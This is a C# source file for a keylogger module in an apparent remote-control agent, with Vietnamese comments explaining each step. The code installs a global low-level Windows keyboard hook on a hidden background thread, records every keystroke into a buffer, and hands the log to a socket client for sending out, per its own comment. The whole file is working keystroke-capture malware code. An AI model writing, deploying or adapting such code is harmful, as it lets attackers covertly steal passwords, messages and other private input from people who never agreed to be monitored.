// File: Services/Input/Keylogger.cs
using RemoteControl.Agent.Native;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms; // Cần bật UseWindowsForms trong csproj
using static RemoteControl.Agent.Native.NativeMethods;

namespace RemoteControl.Agent.Services.Input
{
    public class Keylogger
    {
        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static StringBuilder _logBuffer = new StringBuilder();
        private Thread? _loggerThread;

        public Keylogger()
        {
            // Khởi chạy Keylogger trên một luồng riêng biệt
            // Lý do: Hook cần một "Message Loop" (Vòng lặp tin nhắn) để hoạt động
            _loggerThread = new Thread(StartHookLoop);
            _loggerThread.IsBackground = true;
            _loggerThread.Start();
        }

        // Hàm này sẽ chạy ngầm vĩnh viễn
        private void StartHookLoop()
        {
            try
            {
                _hookID = SetHook(_proc);

                // Vòng lặp giữ cho Hook sống (Message Pump)
                // Nếu không có đoạn này, Hook sẽ bị hủy ngay lập tức
                NativeMethods.MSG msg;
                while (NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))
                {
                    NativeMethods.TranslateMessage(ref msg);
                    NativeMethods.DispatchMessage(ref msg);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Lỗi Keylogger thread: " + ex.Message);
            }
            finally
            {
                // Gỡ hook khi thoát
                NativeMethods.UnhookWindowsHookEx(_hookID);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule? curModule = curProcess.MainModule)
            {
                return NativeMethods.SetWindowsHookEx(
                    NativeMethods.WH_KEYBOARD_LL,
                    proc,
                    NativeMethods.GetModuleHandle(curModule?.ModuleName ?? "user32"),
                    0);
            }
        }

        // Hàm này được gọi mỗi khi có phím nhấn
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Chuyển mã số sang tên phím (Ví dụ: 65 -> A, 13 -> Enter)
                string keyName = ((Keys)vkCode).ToString();

                // Xử lý cho đẹp log
                if (keyName == "Return" || keyName == "Enter") keyName = "\n[ENTER]";
                else if (keyName == "Space") keyName = " ";
                else if (keyName.Contains("Control") || keyName.Contains("Alt") || keyName.Contains("Shift"))
                {
                    // Có thể bỏ qua hoặc ghi chú lại phím chức năng
                    keyName = $"[{keyName}]";
                }

                lock (_logBuffer) // Khóa lại để tránh xung đột luồng
                {
                    _logBuffer.Append(keyName);
                }
            }

            // Quan trọng: Phải trả về lệnh cho hệ thống để phím vẫn hoạt động bình thường
            return NativeMethods.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Hàm cho SocketClient gọi để lấy dữ liệu gửi đi
        public string GetLogAndClear()
        {
            lock (_logBuffer)
            {
                if (_logBuffer.Length == 0) return string.Empty;

                string data = _logBuffer.ToString();
                _logBuffer.Clear(); // Xóa bộ nhớ đệm sau khi lấy
                return data;
            }
        }
    }
}